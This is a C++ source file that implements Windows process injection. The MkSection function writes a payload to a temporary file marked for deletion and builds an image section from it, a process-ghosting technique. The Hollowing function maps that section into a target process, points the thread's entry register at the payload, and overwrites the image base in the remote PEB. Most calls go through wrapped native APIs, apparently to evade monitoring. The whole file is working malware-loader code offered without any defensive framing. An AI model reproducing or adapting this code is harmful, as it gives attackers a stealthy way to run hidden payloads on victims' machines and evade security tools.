#pragma once

#include "ntos.h"
// #include "logger.h"
#include "common.h"
#include <vector>

HANDLE MkSection(LPBYTE pPayloadBuffer, SIZE_T size);

#define nt_chk(expr) if (!NT_SUCCESS((expr)))

// ...

// return PEB Addr
LPVOID Hollowing(
  HANDLE hTargetProcess,
  HANDLE hTargetThread,
  HANDLE hSourceProcess,
  std::vector<u8>& payload
  // LPBYTE lpPayloadImageBase,
  // SIZE_T payloadImageSize
) {
  LPVOID ret_val = NULL;
  LPBYTE lpPayload = payload.data();
  SIZE_T payloadImageSize = payload.size();
  // SIZE_T rgnSize = payloadImageSize + 0xfff & -0x1000;
  // nt_chk(xNtAllocateVirtualMemory(
  //   (HANDLE)-1, (LPVOID*)&lpPayload, 0,
  //   &rgnSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE
  // )) {
  //   goto stage1;
  // }

  // logger("Payload buffer [addr = %p, size = %#x bytes]",
  //   lpPayload, rgnSize);
  // SSIZE_T rem = payloadImageSize, offset = 0;
  SIZE_T ret;
  // // logger("Reading payload from hProcess=%x", (SIZE_T)hSourceProcess);
  // while (rem > 0) {
  //   xNtReadVirtualMemory(hSourceProcess, lpPayloadImageBase + offset,
  //     lpPayload + offset, rem, &ret);
  //   offset += ret;
  //   rem -= ret;
  // }

  HANDLE h_section = MkSection(lpPayload, payloadImageSize);
  if (!h_section || h_section == INVALID_HANDLE_VALUE) {
    // logger("MkSection failed.");
    goto stage1_ok;
  }

  NTSTATUS status = STATUS_SUCCESS;
  SIZE_T viewSize = 0;
  PVOID remote_base = 0;
  if ((status = xNtMapViewOfSection(h_section,
    hTargetProcess, &remote_base,
    NULL, NULL, NULL, &viewSize, ViewShare,
    NULL, PAGE_READONLY)) != STATUS_SUCCESS)
  {
    if (status == STATUS_IMAGE_NOT_AT_BASE) {
      // logger("[WARNING] Image could not be mapped at its original base! If the payload has no relocations, it won't work!");
    }
    else {
      // logger("[ERROR] NtMapViewOfSection failed, status: %8x", status);
      goto stage1_ok;
    }
  }

  // logger("Mapped Base: %p", remote_base);
  // redirect2payload(payladBuf, remote_base, pi, isPayl32b)
  LPBYTE loaded_pe = lpPayload;
  LPBYTE load_base = (LPBYTE)remote_base;

  // read entry point
  PIMAGE_NT_HEADERS64 pNtHdr = PIMAGE_NT_HEADERS64(lpPayload + *(PDWORD)(lpPayload + 0x3c));
  ULONGLONG ep_va = (ULONGLONG)load_base + pNtHdr->OptionalHeader.AddressOfEntryPoint;

  // logger("[Payload] entrypoint = %p", (PVOID)ep_va);
  // write entrypoint to new process as context
  CONTEXT ctx{};
  ctx.ContextFlags = CONTEXT_INTEGER;
  xNtGetContextThread(hTargetThread, &ctx);
  ctx.Rcx = ep_va;
  xNtSetContextThread(hTargetThread, &ctx);

  // get access to remote peb
  ULONGLONG remote_peb_addr = ctx.Rdx;
  LPVOID remote_img_base = (LPVOID)(remote_peb_addr + 0x10);
  // write image base at peb
  xNtWriteVirtualMemory(
    hTargetProcess, remote_img_base,
    &load_base, 8, &ret
  );
  ret_val = (PVOID)remote_peb_addr;

stage1_ok:
  usize rsz{};
  // xNtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&lpPayload, &rsz, MEM_RELEASE);
stage1:
  (void)h_section;
  return ret_val;
}

#include <string>

HANDLE
MkSection(LPBYTE pPayloadBuffer, SIZE_T payloadSize)
{
  wchar_t filePath[MAX_PATH] = { 0 };
  wchar_t temp_path[MAX_PATH] = { 0 };
  DWORD size = xGetTempPathW(MAX_PATH, temp_path);
  xGetTempFileNameW(temp_path, L"TH", 0, filePath);
  std::wstring nt_path = L"\\??\\" + std::wstring(filePath);
  UNICODE_STRING file_name = { 0 };
  xRtlInitUnicodeString(&file_name, nt_path.c_str());

  OBJECT_ATTRIBUTES attr = { 0 };
  InitializeObjectAttributes(&attr, &file_name, OBJ_CASE_INSENSITIVE, NULL, NULL);
  IO_STATUS_BLOCK status_block = { 0 };
  HANDLE hDelFile = INVALID_HANDLE_VALUE;
  nt_chk(xNtOpenFile(&hDelFile,
    DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
    &attr,
    &status_block,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
  )) {
    return INVALID_HANDLE_VALUE;
  }

  // logger("temp file name: %S", filePath);
  // logger("temp file created: %x", (DWORD)hDelFile);
  memset(&status_block, 0, sizeof status_block);
  FILE_DISPOSITION_INFORMATION info = { 0 };
  info.DeleteFile = TRUE;

  nt_chk(xNtSetInformationFile(hDelFile, &status_block, &info, sizeof(info), FileDispositionInformation)) {
    return INVALID_HANDLE_VALUE;
  }

  // logger("file marked for delete.");
  LARGE_INTEGER ByteOffset = { 0 };

  nt_chk(xNtWriteFile(
    hDelFile,
    NULL,
    NULL,
    NULL,
    &status_block,
    pPayloadBuffer,
    payloadSize,
    &ByteOffset,
    NULL
  )) {
    return INVALID_HANDLE_VALUE;
  }
  // logger("payload written to file.");

  HANDLE hSection = NULL;
  nt_chk(xNtCreateSection(&hSection,
    SECTION_ALL_ACCESS,
    NULL,
    0,
    PAGE_READONLY,
    SEC_IMAGE,
    hDelFile
  )) {
    return INVALID_HANDLE_VALUE;
  }
  // logger("section created for image: %x", (DWORD)hSection);

  xCloseHandle(hDelFile);
  return hSection;
}